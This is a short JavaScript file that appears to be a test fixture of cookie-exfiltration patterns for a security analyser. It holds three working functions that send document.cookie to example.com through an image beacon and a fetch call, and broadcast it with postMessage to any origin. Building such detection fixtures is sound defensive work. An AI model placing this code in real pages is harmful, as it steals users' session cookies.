// Leakage/exfiltration patterns. No DOM sinks; network/postMessage only.
(function(){
  function runCookieLeakImage() {
    var url = "https://example.com/beacon.gif?c=" + encodeURIComponent(document.cookie);
    var img = new Image();
    img.src = url;
  }

  function runCookieLeakFetch() {
    var url = "https://example.com/collect";
    try {
      fetch(url + "?c=" + encodeURIComponent(document.cookie), { method: "GET", mode: "no-cors" });
    } catch (e) {}
  }

  function runCookieLeakPostMessage() {
    // Simulate exfil to another window/origin (tab must exist to receive)
    try {
      window.postMessage({ exfil: document.cookie }, "*");
    } catch (e) {}
  }

  Object.assign(window, {
    runCookieLeakImage,
    runCookieLeakFetch,
    runCookieLeakPostMessage
  });
})();
